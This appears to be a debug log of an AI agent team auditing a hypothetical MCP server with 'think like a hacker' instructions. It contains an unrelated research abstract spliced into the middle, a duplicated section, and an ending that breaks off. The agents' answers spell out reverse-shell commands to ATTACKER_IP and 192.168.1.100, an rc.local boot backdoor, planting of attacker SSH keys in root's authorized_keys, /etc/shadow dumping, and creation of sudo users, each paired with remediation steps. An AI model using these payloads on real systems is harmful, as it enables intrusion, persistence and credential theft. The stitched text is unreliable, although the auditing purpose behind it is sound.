      <how_to_respond>
      - You can either respond directly or use the `run_member_agents` tool to run all members in your team to get a collaborative response.
      - To run the members in your team, call `run_member_agents` ONLY once. This will run all members in your team.
      - Analyze the responses from all members and evaluate whether the task has been completed.
      - If you feel the task has been completed, you can stop and respond to the user.
      </how_to_respond>

      <shared_context>
      You have access to a shared context that will be shared with all members of the team.
      Use this shared context to improve inter-agent communication and coordination.
      It is important that you update the shared context as often as possible.
      To update the shared context, use the `set_shared_context` tool.
      </shared_context>

      Your task is successful when the following criteria is met:
      <success_criteria>
      The team has done an exhaustive search and identified all vulnerabilities arising from the MCP Server(s) interactions, an example of how the attacker would use that tool, resource, prompt
      for some nefarious reason, and provided remediation steps.
      </success_criteria>
      Stop the team run when the success_criteria is met.

      <instructions>
      - You are a security auditor, looking for vulnerabilities in the MCP Server implementation.
      - The vulnerabilities should be directly based on the how the MCP Server utilizes its implemented (tools, prompts, and resources), and then you should consider how a hacker might abuse   
      these tools to gain access, dump credentials, add backdoors to startup scripts, add their own ssh keys in etc.
      - Ensure that you are thinking like a hacker, with the goal of gaining access, lateral movement, getting callbacks using netcat, dumping credentials such as ssh keys, adding credentials  
      like public ssh keys to authorized keys etc.
      - You are given a list of tools, prompts, and resources that are available on the MCP Server.
      - You are given a list of directories that you can access on the MCP Server.
      - For each attack show a concrete of example, like modifying bashrc, adding a public key to authorized_keys, adding a backdoor to a startup script, etc.

      You are a security auditor, analyzing the MCP server for vulnerabilities.
      The MCP server has the following assumed tools, prompts, resources, and accessible directories:

      **Assumed MCP Server Tools:**
      *   `system_command_executor`: Allows execution of arbitrary shell commands.
      *   `file_manager`: Allows reading, writing, and deleting files.
      *   `network_scanner`: Scans network for open ports and services.
      *   `user_manager`: Manages user accounts, including adding/deleting users and modifying permissions.

      **Assumed MCP Server Prompts:**
      *   "Please enter your credentials for system access." (Generic prompt, could be vulnerable to injection if not handled carefully)
      *   "What action would you like to perform? (e.g., 'list files', 'run command', 'scan network')"

      **Assumed MCP Server Resources:**
      *   `/etc/passwd`: System user information.
      *   `/etc/shadow`: Hashed passwords (requires root).
      *   `/etc/ssh/sshd_config`: SSH server configuration.
      *   `~/.ssh/authorized_keys`: User's authorized SSH keys.
      *   `/var/log/auth.log`: Authentication logs.
      *   `/root/.bashrc`, `~/.bashrc`: Bash startup scripts.
      *   `/etc/rc.local`, `/etc/init.d/*`: System startup scripts.

      **Assumed Accessible Directories:**
      *   `/tmp/`: Temporary directory.
      *   `/home/<username>/`: User home directories.
      *   `/var/www/html/`: Web server root (if applicable).
      *   `/etc/`: System configuration files.
      *   `/opt/`: Optional software packages.

      Your task is to:
      1.  Identify vulnerabilities arising from the MCP Server's interaction with these assumed tools, prompts, and resources.
      2.  For each vulnerability, provide a concrete example of how an attacker would exploit it. Think like a hacker, aiming for:
          *   Gaining access
          *   Lateral movement
          *   Getting callbacks (e.g., using netcat)
          *   Dumping credentials (e.g., SSH keys, password hashes)
          *   Adding credentials (e.g., public SSH keys to authorized_keys)
          *   Adding backdoors to startup scripts
          *   Modifying critical system files.
      3.  Suggest clear remediation steps for each identified vulnerability.

      significant threats to users' privacy and safety.\nWhen multiple devices are connected to a voice assistant, an attacker can cause\nserious damage if they can gain control of these       
      devices. We ask where and how\ncan an attacker issue clean voice commands stealthily across a physical\nbarrier, and perform the first academic measurement study of this nature on        
      the\ncommand injection attack. We present the BarrierBypass attack that can be\nlaunched against three different barrier-based scenarios termed across-door,\nacross-window, and
      across-wall. We conduct a broad set of experiments to\nobserve the command injection attack success rates for multiple speaker samples\n(TTS and live human recorded) at different command 
      audio volumes (65, 75, 85\ndB), and smart speaker locations (0.1-4.0m from barrier). Against Amazon Echo\nDot 2, BarrierBypass is able to achieve 100% wake word and command
      injection\nsuccess for the across-wall and across-window attacks, and for the across-door\nattack (up to 2 meters). At 4 meters for the across-door attack, BarrierBypass\ncan achieve 90% 
      and 80% injection accuracy for the wake word and command,\nrespectively. Against Google Home mini BarrierBypass is able to achieve 100%\nwake word injection accuracy for all attack       
      scenarios. For command injection\nBarrierBypass can achieve 100% accuracy for all the three barrier settings (up\nto 2 meters). For the across-door attack at 4 meters, BarrierBypass can  
      achieve\n80% command injection accuracy. Further, our demonstration using drones yielded\nhigh command injection success, up to 100%. Overall, our results demonstrate\nthe potentially    
      devastating nature of this vulnerability to control a user's\ndevice from outside of the device's physical space.",

      *   **Vulnerability Description**: The `system_command_executor` tool, if directly processing user input from the "What action would you like to perform?" prompt without proper
      sanitization, is highly susceptible to command injection. An attacker can append arbitrary shell commands using metacharacters (e.g., `;`, `|`, `&&`) to achieve various malicious goals.  
      *   **Affected (Tool, Prompt, Resource)**: (`system_command_executor`, "What action would you like to perform?", Any accessible resource or directory)

      *   **Command-line Example (Exploitation)**: Gaining a reverse shell for callback.
          ```bash
          # Attacker's input to the MCP server when prompted for an action/command:
          list files; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
          ```
          *   **Explanation**: This input attempts to execute the `list files` command, then immediately initiates a reverse shell connection back to the attacker's machine (`ATTACKER_IP` on   
      port `4444`). The attacker would have a `netcat` listener set up on their machine to receive the connection.
          *   **Source Citation (Command-line Example)**:
              *   DuckDuckGo: "netcat reverse shell command", specifically examples like `nc -lvp 4444` and `/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`.
              *   Reference: SANS Institute. (n.d.). *Reverse Shell Cheat Sheet*. Retrieved from various online security resources and tutorials on Netcat usage.

      *   **Remediation Command (Conceptual)**: Implement strict input validation and sanitization. The remediation is primarily at the application code level, not a direct shell command.      
          ```
          # Conceptual Remediation Principle: Input Validation and Sanitization
          # Instead of direct execution like:
          # os.system(user_input)
          #
          # Or:
          # subprocess.run(f"some_command {user_input}", shell=True)
          #
          # Implement whitelisting or robust escaping:
          #
          # Example using Python's shlex.quote for escaping command arguments (if arguments are dynamic):
          # import shlex
          # safe_arg = shlex.quote(user_provided_argument)
          # subprocess.run(["ls", "-l", safe_arg], shell=False)
          #
          # For allowing specific commands, use a whitelist:
          # if user_action == "list files":
          #     subprocess.run(["ls", "-l"])
          # elif user_action == "run custom script":
          #     # Only allow execution of pre-defined, safe scripts
          #     subprocess.run(["/usr/local/bin/safe_script.sh", user_input_for_script])
          # else:
          #     log_and_reject_invalid_action()
          ```

      ### **Vulnerability 2: Insecure file operations via `file_manager` tool with access to sensitive system files**

      *   **Vulnerability Description**: If the `file_manager` tool allows arbitrary read/write/delete operations on sensitive system files without enforcing strict access controls or input    
      validation (e.g., path traversal checks), an attacker can access confidential information, gain persistent access, or introduce backdoors.
      *   **Affected (Tool, Prompt, Resource)**: (`file_manager`, "What action would you like to perform?", `/etc/passwd`, `/etc/shadow`, `~/.ssh/authorized_keys`, `/root/.bashrc`,
      `/etc/rc.local`, `/etc/init.d/*`)

      #### **Exploitation Example 2.1: Dumping password hashes from `/etc/shadow`**

      *   **Goal**: Information Disclosure, Privilege Escalation (through offline cracking).
      *   **Command-line Example (Attacker)**:
          ```bash
          # Attacker's input to the MCP server:
          read file /etc/shadow
          ```
          *   **Explanation**: This command attempts to read the `/etc/shadow` file, which contains hashed user passwords. If the `file_manager` runs with sufficient privileges (e.g., as root),
      it will return the contents, allowing the attacker to attempt offline password cracking.
          *   **Source Citation (Command-line Example)**:
              *   DuckDuckGo: "read /etc/shadow contents", "dump password hashes linux".
              *   Reference: Various Linux system administration guides and penetration testing resources.

      #### **Exploitation Example 2.2: Adding an SSH public key to `~/.ssh/authorized_keys` for persistent access**

      *   **Goal**: Gaining Access, Persistence.
      *   **Command-line Example (Attacker)**:
          ```bash
          # Attacker's input to the MCP server:
          write to file /home/<username>/.ssh/authorized_keys with content 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@example.com'
          ```
          *   **Explanation**: The attacker writes their public SSH key into the `authorized_keys` file of a target user (e.g., `<username>` or `root`). This grants the attacker SSH access to  
      the system as that user without needing a password.
          *   **Source Citation (Command-line Example)**:
              *   DuckDuckGo: "add ssh key authorized_keys backdoor", "ssh authorized_keys for access".
              *   Reference: Standard SSH key authentication documentation.

      #### **Exploitation Example 2.3: Adding a backdoor to `/etc/rc.local` for persistent root access**

      *   **Goal**: Adding Backdoors, Persistence, Privilege Escalation.
      *   **Command-line Example (Attacker)**:
          ```bash
          # Attacker's input to the MCP server:
          append to file /etc/rc.local with content 'chmod +x /tmp/backdoor.sh; /tmp/backdoor.sh &'
          # Followed by (if separate commands or capabilities):
          write to file /tmp/backdoor.sh with content '#!/bin/bash\n/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
          ```
          *   **Explanation**: The attacker first writes a simple reverse shell script to `/tmp/backdoor.sh`. Then, they append a command to `/etc/rc.local` (a system startup script) to make   
      the backdoor script executable and run it on boot. This ensures that the reverse shell is established every time the system starts, providing persistent access.
          *   **Source Citation (Command-line Example)**:
              *   DuckDuckGo: "rc.local reverse shell persistence", "linux persistence mechanisms".
              *   Reference: Various penetration testing and system hardening guides.

      *   **Remediation Commands (for 2.1, 2.2, 2.3)**: Implement strict access control, path validation, and the principle of least privilege for the `file_manager` tool.

          1.  **Restrict File Permissions**: Ensure sensitive files have minimal read/write permissions.
              ```bash
              sudo chmod 640 /etc/shadow # Read by root, group shadow
              sudo chown root:shadow /etc/shadow
              sudo chmod 600 /etc/ssh/sshd_config # Read/write by root only
              sudo chown root:root /etc/ssh/sshd_config
              sudo chmod 600 /home/<username>/.ssh/authorized_keys # User read/write only
              sudo chown <username>:<username> /home/<username>/.ssh/authorized_keys
              sudo chmod 750 /etc/rc.local # Executable by root, read by group
              sudo chown root:root /etc/rc.local
              ```
          2.  **Path Validation in `file_manager`**: Prevent path traversal attacks and ensure operations only occur in sanctioned directories.
              ```
              # Conceptual Remediation Principle: Path Validation
              # Before any file operation, canonicalize the path and check against a whitelist:
              # import os
              # requested_path = user_input_path
              # absolute_path = os.path.abspath(os.path.join(base_directory, requested_path))
              #
              # if not absolute_path.startswith(base_directory):
              #     raise PermissionError("Path traversal attempt detected!")
              #
              # # Further checks for sensitive files:
              # if absolute_path in ["/etc/shadow", "/etc/passwd"]:
              #     if not is_admin_user(current_user): # Custom authorization check
              #         raise PermissionError("Access denied to sensitive file.")
              ```
          3.  **Principle of Least Privilege**: Run the `file_manager` process with the lowest possible user privileges, and use granular authorization checks for each file operation.

      ### **Vulnerability 3: Insecure network scanning with `network_scanner` leading to potential information disclosure or DoS**

      *   **Vulnerability Description**: If the `network_scanner` tool allows arbitrary target specifications (IP addresses, ranges, domains) without restrictions or rate limiting, an attacker 
      can use it for extensive internal network reconnaissance, mapping the network topology, discovering active hosts, and identifying open ports and services. It could also be abused for     
      denial-of-service (DoS) attacks if the scanning is aggressive and unthrottled.
      *   **Affected (Tool, Prompt, Resource)**: (`network_scanner`, "What action would you like to perform?", Internal network (implicit resource))

      *   **Command-line Example (Exploitation)**: Internal network reconnaissance.
          ```bash
          # Attacker's input to the MCP server:
          scan network 192.168.1.0/24
          ```
          *   **Explanation**: The attacker instructs the `network_scanner` to scan an entire internal subnet (e.g., `192.168.1.0/24`). The output would reveal live hosts, their open ports, and
      potentially services running, providing critical information for lateral movement within the network.
          *   **Source Citation (Command-line Example)**:
              *   DuckDuckGo: "nmap internal network reconnaissance example", "subnet scanning commands".
              *   Reference: Nmap official documentation and common penetration testing methodologies.

      *   **Remediation Commands (Conceptual)**: Restrict `network_scanner` functionality, implement target whitelisting, and enforce rate limiting.

          1.  **Target Whitelisting**: Configure the `network_scanner` to only operate on pre-defined, safe IP ranges (e.g., localhost) or specific, explicitly approved external domains. Reject
      any user-provided arbitrary IP ranges or internal network segments.
          2.  **Rate Limiting**: Implement rate limiting on scanning requests to prevent abuse and DoS.
          3.  **Logging**: Log all scan requests, including the source user and target, for auditing purposes.
          4.  **Isolation**: Run the `network_scanner` in a sandboxed environment (e.g., container, separate VLAN) with limited network visibility to protect the internal network.

      ---

      ### **Vulnerability 4: Privilege Escalation/Account Manipulation via `user_manager` tool**

      *   **Vulnerability Description**: If the `user_manager` tool allows adding/deleting users or modifying user permissions (e.g., adding to `sudo` group) without robust authentication,     
      authorization, and auditing, an attacker can create new privileged accounts or escalate the privileges of existing accounts, leading to complete system compromise.
      *   **Affected (Tool, Prompt, Resource)**: (`user_manager`, "What action would you like to perform?", `/etc/passwd`, `/etc/shadow`)

      *   **Command-line Example (Exploitation)**: Creating a new root-equivalent user.
          ```bash
          # Attacker's input to the MCP server:
          add user 'eviluser' with password 'pwnedpass' to group 'sudo'
          ```
          *   **Explanation**: The attacker uses the `user_manager` to create a new user named `eviluser` with a specified password and adds them to the `sudo` group. This grants `eviluser`    
      root privileges, allowing the attacker full control over the system.
          *   **Source Citation (Command-line Example)**:
              *   DuckDuckGo: "add user to sudo group command", "create new root user linux".
              *   Reference: Linux `useradd`, `usermod` commands, and sudoers configuration.

      *   **Remediation Commands (Conceptual)**: Implement strong authentication, granular authorization, and comprehensive auditing for `user_manager` actions.

          1.  **Strong Authentication**: Enforce multi-factor authentication (MFA) for any administrative actions performed via the `user_manager` tool.
          2.  **Granular Authorization**: Implement Role-Based Access Control (RBAC) to ensure only highly privileged and explicitly authorized administrators can perform user management tasks.
          3.  **Comprehensive Auditing**: Log all `user_manager` actions, including the user, timestamp, and specific changes made (e.g., user added, user deleted, group modification).
              ```bash
              # Example using auditd to log changes to critical user files:
              sudo apt-get install auditd # On Debian/Ubuntu
              sudo systemctl enable auditd
              sudo systemctl start auditd
              sudo auditctl -w /etc/passwd -p wa -k passwd_changes # Log writes/attribute changes to passwd
              sudo auditctl -w /etc/shadow -p wa -k shadow_changes # Log writes/attribute changes to shadow
              sudo auditctl -w /etc/group -p wa -k group_changes   # Log writes/attribute changes to group
              sudo auditctl -w /etc/sudoers -p wa -k sudoers_changes # Log writes/attribute changes to sudoers
              sudo service auditd restart
              ```

      ### **Vulnerability 5: Information Disclosure/Data Exfiltration via `file_manager` and access to `/var/log/auth.log` or web server roots**

      *   **Vulnerability Description**: If the `file_manager` allows unauthorized reading of log files like `/var/log/auth.log` or content from web server roots like `/var/www/html/`, an      
      attacker can gather sensitive operational information, enumerate usernames, or exfiltrate web application source code and configuration files.
      *   **Affected (Tool, Prompt, Resource)**: (`file_manager`, "What action would you like to perform?", `/var/log/auth.log`, `/var/www/html/`)

      #### **Exploitation Example 5.1: Reading authentication logs for username enumeration**

      *   **Goal**: Information Disclosure, Reconnaissance.
      *   **Command-line Example (Attacker)**:
          ```bash
          # Attacker's input to the MCP server:
          read file /var/log/auth.log
          ```
          *   **Explanation**: Reading the `auth.log` file can expose attempted logins, including valid and invalid usernames. This information is valuable for an attacker attempting to        
      enumerate valid user accounts on the system, which can then be used in brute-force or social engineering attacks.
          *   **Source Citation (Command-line Example)**:
              *   DuckDuckGo: "username enumeration from auth.log", "read authentication logs linux".
              *   Reference: Various ethical hacking and penetration testing guides.

      #### **Exploitation Example 5.2: Exfiltrating web application source code from `/var/www/html/`**

      *   **Goal**: Data Exfiltration, Information Disclosure.
      *   **Command-line Example (Attacker)**:
          ```bash
          # Attacker's input to the MCP server:
          read directory /var/www/html/
          read file /var/www/html/index.php
          ```
          *   **Explanation**: By reading the contents of the web server root and its files, an attacker can exfiltrate sensitive web application source code, configuration files (e.g.,        
      database credentials), and other proprietary information.
          *   **Source Citation (Command-line Example)**:
              *   DuckDuckGo: "web server source code disclosure vulnerability", "read web root files".
              *   Reference: OWASP Top 10 A01:2021-Broken Access Control and A03:2021-Injection (for potential config file vulnerabilities).

      *   **Remediation Commands**: Implement strict access control for log and web server directories, and ensure proper file permissions.

          1.  **Restrict Log File Permissions**: Limit read access to log files to authorized users/groups.
              ```bash
              sudo chmod 640 /var/log/auth.log
              sudo chown root:adm /var/log/auth.log # Only root and members of 'adm' group can read
              ```
          2.  **Secure Web Server Directory Permissions**: Ensure web server content has appropriate permissions to prevent unauthorized reading or writing.
              ```bash
              sudo chmod -R 755 /var/www/html # Directories
              sudo find /var/www/html -type f -exec sudo chmod 644 {} \; # Files
              sudo chown -R www-data:www-data /var/www/html # Owner and group for web server
              ```
          3.  **Input Validation and Authorization for `file_manager`**: Ensure the `file_manager` tool performs robust checks before allowing access to these directories.

DEBUG ================================================================================= assistant =================================================================================
DEBUG As a security auditor analyzing the MCP Server, I've identified several critical vulnerabilities arising from the interaction between its assumed tools, prompts, and accessible resources.
      My analysis focuses on how an attacker could leverage these components to gain access, move laterally, establish persistence, and extract sensitive information.

      ---

      ### 1. Command Injection via `system_command_executor` and Prompts

      *   **Vulnerability Explanation:** The `system_command_executor` tool is designed to run arbitrary shell commands. If user input from prompts (e.g., "What action would you like to        
      perform?") is not properly sanitized before being passed to this executor, an attacker can inject shell metacharacters (like `&`, `|`, `;`, `$(...)`, `` ` ``) to execute arbitrary        
      commands on the underlying system. This is a severe vulnerability, often leading to full system compromise.

      *   **Exploitation Example (Gaining Access, Dumping Credentials, Callback):**
          *   **Goal:** Read sensitive files, add an SSH key for persistence, or get a reverse shell.
          *   **Scenario:** The MCP Server presents a prompt like "What action would you like to perform? (e.g., 'list files', 'run command', 'scan network')". An attacker chooses "run
      command", and the subsequent input field for the command is vulnerable to injection.
          *   **Command-line Example (Dumping `/etc/shadow` - requires root/elevated privileges for the MCP process):**
              ```bash
              # Attacker inputs into the MCP Server's prompt:
              run command; cat /etc/shadow > /tmp/shadow_dump.txt; chmod 644 /tmp/shadow_dump.txt; # Attacker would then retrieve /tmp/shadow_dump.txt via file_manager.
              ```
          *   **Command-line Example (Adding Attacker's SSH Key for Persistence - `~/.ssh/authorized_keys`):**
              ```bash
              # Attacker inputs into the MCP Server's prompt:
              run command; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAQC... attacker@evil.com" >> ~/.ssh/authorized_keys
              # (Replace `attacker@evil.com` with your public key)
              ```
          *   **Command-line Example (Getting a Reverse Shell Callback):**
              ```bash
              # Attacker inputs into the MCP Server's prompt (assuming attacker's IP is 192.168.1.100, port 4444):
              run command; nc -e /bin/bash 192.168.1.100 4444
              # If `nc -e` is not available:
              run command; /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
              ```

      *   **Remediation Command (Conceptual, targeting the application logic and environment):**
          The primary remediation for command injection is robust input validation and sanitization within the application code, not a simple shell command. However, hardening the execution    
      environment is crucial.
          ```bash
          # 1. Implement principle of least privilege: Run the MCP server with a dedicated, unprivileged user.
          # 2. Avoid direct shell execution with user input. Use specific API calls or carefully quoted arguments.
          # 3. If `system_command_executor` runs with `sudo`, restrict its sudoers entry to specific, whitelisted commands only.
          # Example (editing sudoers file to limit `mcpuser`):
          sudo visudo
          # Add an entry like:
          # mcpuser ALL=(ALL) NOPASSWD: /usr/bin/ls, /usr/bin/cat /etc/passwd
          # This example specifically whitelists 'ls' and 'cat /etc/passwd' and prevents arbitrary commands.
          # **Crucially, ensure 'mcpuser' cannot run 'bash', 'sh', or any command that allows arbitrary execution.**
          ```

      ### 2. Insecure File Operations via `file_manager`

      *   **Vulnerability Explanation:** The `file_manager` tool allows reading, writing, and deleting files. If it lacks proper authorization checks or path sanitization, an attacker can read 
      sensitive system files, modify critical configuration files, or inject malicious code into startup scripts or user configuration files for persistence. This is particularly dangerous if  
      the `file_manager` operates with elevated privileges.

      *   **Exploitation Example (Adding Credentials - SSH Key for Persistence):**
          *   **Goal:** Add attacker's public SSH key to a user's `authorized_keys` file for passwordless SSH access.
          *   **Scenario:** The `file_manager` allows writing to arbitrary file paths.
          *   **Command-line Example (Adding to a user's `authorized_keys`):**
              ```bash
              # Server prompt: "What action would you like to perform?"
              # Attacker inputs: write file
              # Server asks: "What file path?"
              # Attacker inputs: /home/<target_username>/.ssh/authorized_keys
              # Server asks: "What content?"
              # Attacker inputs: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAQC... attacker@evil.com
              # This assumes the file_manager can append or overwrite the file.
              ```

      *   **Exploitation Example (Adding Backdoor to Startup Script - `/etc/rc.local`):**
          *   **Goal:** Execute an arbitrary command (e.g., reverse shell) every time the system boots.
          *   **Scenario:** The `file_manager` allows appending content to system startup scripts, and the MCP process has permissions to modify it.
          *   **Command-line Example:**
              ```bash
              # Server prompt: "What action would you like to perform?"
              # Attacker inputs: append file
              # Server asks: "What file path?"
              # Attacker inputs: /etc/rc.local
              # Server asks: "What content?"
              # Attacker inputs: /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 &
              # (This will attempt to initiate a reverse shell on boot. Requires `&` to background the process and allow boot to continue.)
              ```

      *   **Remediation Command (System-wide hardening and application logic):**
          ```bash
          # 1. Run the MCP server with the least necessary privileges.
          # 2. Implement robust authorization checks within `file_manager` to prevent unprivileged users from accessing sensitive files.
          # 3. Prevent directory traversal (e.g., `../`) in file paths and use whitelisting for allowed file operations.
          # 4. Ensure critical files and directories have restrictive permissions:
          sudo chmod 600 /etc/shadow
          sudo chown root:shadow /etc/shadow
          sudo chmod 644 /etc/passwd
          sudo chown root:root /etc/passwd
          sudo chmod 700 /etc/rc.local # Or 755 if executable, but not world-writable
          sudo chown root:root /etc/rc.local
          # Ensure user SSH directories are secure
          sudo chmod 700 /home/<username>/.ssh
          sudo chmod 600 /home/<username>/.ssh/authorized_keys
          ```

      ---

      ### 3. Privilege Escalation via `user_manager`

      *   **Vulnerability Explanation:** The `user_manager` tool is designed for managing user accounts and permissions. If an unprivileged user can directly access this tool or inject commands
      into it (via Vulnerability 1) to create new users, modify passwords, or alter group memberships (e.g., add to `sudo` group), they can easily escalate privileges.

      *   **Exploitation Example (Adding a New Sudo User via Command Injection):**
          *   **Goal:** Create a new user with administrative (sudo) privileges.
          *   **Scenario:** An attacker leverages command injection through `system_command_executor` to execute user management commands as a privileged user (e.g., `root` or a user with      
      `NOPASSWD` sudo).
          *   **Command-line Example:**
              ```bash
              # Attacker inputs into the MCP Server's prompt (assuming command injection in "run command" action):
              run command; sudo useradd -m -s /bin/bash eviluser; sudo echo "eviluser:MyStrongPassword!" | sudo chpasswd; sudo usermod -aG sudo eviluser
              # This command sequence adds a new user 'eviluser', sets their password, and grants them sudo privileges.
              ```

      *   **Remediation Command (Conceptual, focusing on `sudo` and access control):**
          ```bash
          # 1. Strictly enforce authorization for `user_manager` operations, allowing only authenticated administrators.
          # 2. Ensure `system_command_executor` (and any related tools) does not run with privileges that allow arbitrary user management.
          # 3. Regularly audit `/etc/sudoers` and `/etc/sudoers.d/*` files to prevent unauthorized or overly permissive `sudo` entries.
          sudo visudo
          # Manually remove or tighten any entries that allow unprivileged users/groups to run user management commands (`useradd`, `usermod`, `passwd`, `chpasswd`) without proper
      authentication or restrictions.
          # Ensure the MCP server's service account (if any) does not have broad sudo privileges.
          ```

      ---

      ### 4. Information Disclosure (Sensitive File Reading)

      *   **Vulnerability Explanation:** If the `file_manager` tool (or `system_command_executor` via command injection) allows reading of sensitive system files without proper authorization,  
      an attacker can gather critical reconnaissance information. This includes user account details (`/etc/passwd`), SSH server configurations (`/etc/ssh/sshd_config`), and authentication logs
      (`/var/log/auth.log`), which can be used to plan further attacks.

      *   **Exploitation Example (Reading `/etc/passwd` for User Enumeration):**
          *   **Goal:** List all system users to identify potential targets or accounts with weaker security.
          *   **Scenario:** The `file_manager` allows reading `/etc/passwd`.
          *   **Command-line Example:**
              ```bash
              # Server prompt: "What action would you like to perform?"
              # Attacker inputs: read file
              # Server asks: "What file path?"
              # Attacker inputs: /etc/passwd
              # The MCP server displays the content of /etc/passwd.
              ```

      *   **Exploitation Example (Reading `/etc/ssh/sshd_config` for Reconnaissance):**
          *   **Goal:** Understand the SSH server configuration (e.g., allowed users, root login status, port, ciphers) to identify potential vulnerabilities.
          *   **Scenario:** The `file_manager` allows reading `/etc/ssh/sshd_config`.
          *   **Command-line Example:**
              ```bash
              # Server prompt: "What action would you like to perform?"
              # Attacker inputs: read file
              # Server asks: "What file path?"
              # Attacker inputs: /etc/ssh/sshd_config
              # The MCP server displays the content of /etc/ssh/sshd_config.
              ```

      *   **Remediation Command (System-wide permissions and application logic):**
          ```bash
          # 1. Implement strict authorization checks within the `file_manager` to ensure users can only read files they are explicitly permitted to access. Adopt a deny-by-default policy.      
          # 2. Ensure default system file permissions are maintained for sensitive files:
          sudo chmod 644 /etc/passwd
          sudo chmod 644 /etc/ssh/sshd_config
          sudo chmod 640 /var/log/auth.log # Often readable by 'adm' group, but not world-readable
          sudo chown root:root /etc/passwd
          sudo chown root:root /etc/ssh/sshd_config
          sudo chown syslog:adm /var/log/auth.log
          ```

      ---

      ### 5. Persistent Backdoor Installation (Startup Scripts and SSH Authorized Keys)

      *   **Vulnerability Explanation:** By abusing write access through `file_manager` or command injection, an attacker can establish persistent access to the system. This can be achieved by 
      modifying system-wide startup scripts (e.g., `/etc/rc.local`, files in `/etc/init.d/`) to execute malicious commands on boot, or by adding their public SSH key to a user's (especially    
      `root`'s) `~/.ssh/authorized_keys` file for passwordless SSH access.

      *   **Exploitation Example (Adding Reverse Shell to `/etc/rc.local` for Persistence):**
          *   **Goal:** Ensure a reverse shell connection is established every time the system reboots.
          *   **Scenario:** An attacker has write access to `/etc/rc.local` via `file_manager` or `system_command_executor`.
          *   **Command-line Example:**
              ```bash
              # Attacker inputs into the MCP Server's prompt (assuming command injection into `system_command_executor`):
              run command; echo '/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 &' >> /etc/rc.local; chmod +x /etc/rc.local
              # This appends a backgrounded reverse shell command to /etc/rc.local.
              ```

      *   **Exploitation Example (Adding Attacker's SSH Key to `root`'s `authorized_keys` for Direct Root Access):**
          *   **Goal:** Gain direct, passwordless SSH access as the `root` user.
          *   **Scenario:** An attacker has elevated privileges (e.g., through a prior exploit) and can write to `/root/.ssh/authorized_keys`.
          *   **Command-line Example:**
              ```bash
              # Attacker inputs into the MCP Server's prompt (assuming command injection into `system_command_executor` with root privileges):
              run command; mkdir -p /root/.ssh; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAQC... attacker@evil.com" >> /root/.ssh/authorized_keys; chmod 600 /root/.ssh/authorized_keys; chmod 700  
      /root/.ssh/
              ```

      *   **Remediation Command (System-wide permissions and File Integrity Monitoring):**
          ```bash
          # 1. Enforce strict permissions on all system startup scripts and SSH configuration files/directories.
          # 2. Regularly audit these files for unauthorized modifications.
          # 3. Implement File Integrity Monitoring (FIM) to detect changes to critical files and directories.
          # Secure /etc/rc.local:
          sudo chown root:root /etc/rc.local
          sudo chmod 700 /etc/rc.local
          # Secure root's SSH directory:
          sudo chown root:root /root/.ssh
          sudo chmod 700 /root/.ssh
          sudo chown root:root /root/.ssh/authorized_keys
          sudo chmod 600 /root/.ssh/authorized_keys
          # Example FIM installation (AIDE):
          sudo apt update && sudo apt install -y aide
          sudo aide --init # Initialize the database
          sudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db # Move new database to active
          # To check for changes:
          # sudo aide --check
          ```

      ### 1. Command Injection via `system_command_executor` and Prompts

      *   **Vulnerability Explanation:** The `system_command_executor` tool is designed to run arbitrary shell commands. If user input from prompts (e.g., "What action would you like to        
      perform?") is not properly sanitized before being passed to this executor, an attacker can inject shell metacharacters (like `&`, `|`, `;`, `$(...)`, `` ` ``) to execute arbitrary        
      commands on the underlying system. This is a severe vulnerability, often leading to full system compromise.

      *   **Exploitation Example (Gaining Access, Dumping Credentials, Callback):**
          *   **Goal:** Read sensitive files, add an SSH key for persistence, or get a reverse shell.
          *   **Scenario:** The MCP Server presents a prompt like "What action would you like to perform? (e.g., 'list files', 'run command', 'scan network')". An attacker chooses "run
      command", and the subsequent input field for the command is vulnerable to injection.
          *   **Command-line Example (Dumping `/etc/shadow` - requires root/elevated privileges for the MCP process):**
              ```bash
              # Attacker inputs into the MCP Server's prompt:
              run command; cat /etc/shadow > /tmp/shadow_dump.txt; chmod 644 /tmp/shadow_dump.txt; # Attacker would then retrieve /tmp/shadow_dump.txt via file_manager.
              ```
          *   **Command-line Example (Adding Attacker's SSH Key for Persistence - `~/.ssh/authorized_keys`):**
              ```bash
              # Attacker inputs into the MCP Server's prompt:
              run command; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAQC... attacker@evil.com" >> ~/.ssh/authorized_keys
              # (Replace `attacker@evil.com` with your public key)
              ```
          *   **Command-line Example (Getting a Reverse Shell Callback):**
              ```bash
              # Attacker inputs into the MCP Server's prompt (assuming attacker's IP is 192.168.1.100, port 4444):
              run command; nc -e /bin/bash 192.168.1.100 4444
              # If `nc -e` is not available:
              run command; /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
              ```

      *   **Remediation Command (Conceptual, targeting the application logic and environment):**
          The primary remediation for command injection is robust input validation and sanitization within the application code, not a simple shell command. However, hardening the execution    
      environment is crucial.
          ```bash
          # 1. Implement principle of least privilege: Run the MCP server with a dedicated, unprivileged user.
          # 2. Avoid direct shell execution with user input. Use specific API calls or carefully quoted arguments.
          # 3. If `system_command_executor` runs with `sudo`, restrict its sudoers entry to specific, whitelisted commands only.
          # Example (editing sudoers file to limit `mcpuser`):
          sudo visudo
          # Add an entry like:
          # mcpuser ALL=(ALL) NOPASSWD: /usr/bin/ls, /usr/bin/cat /etc/passwd
          # This example specifically whitelists 'ls' and 'cat /etc/passwd' and prevents arbitrary commands.
          # **Crucially, ensure 'mcpuser' cannot run 'bash', 'sh', or any command that allows arbitrary execution.**
          ```

      ### 2. Insecure File Operations via `file_manager`

      *   **Vulnerability Explanation:** The `file_manager` tool allows reading, writing, and deleting files. If it lacks proper authorization checks or path sanitization, an attacker can read 
      sensitive system files, modify critical configuration files, or inject malicious code into startup scripts or user configuration files for persistence. This is particularly dangerous if  
      the `file_manager` operates with elevated privileges.

      *   **Exploitation Example (Adding Credentials - SSH Key for Persistence):**
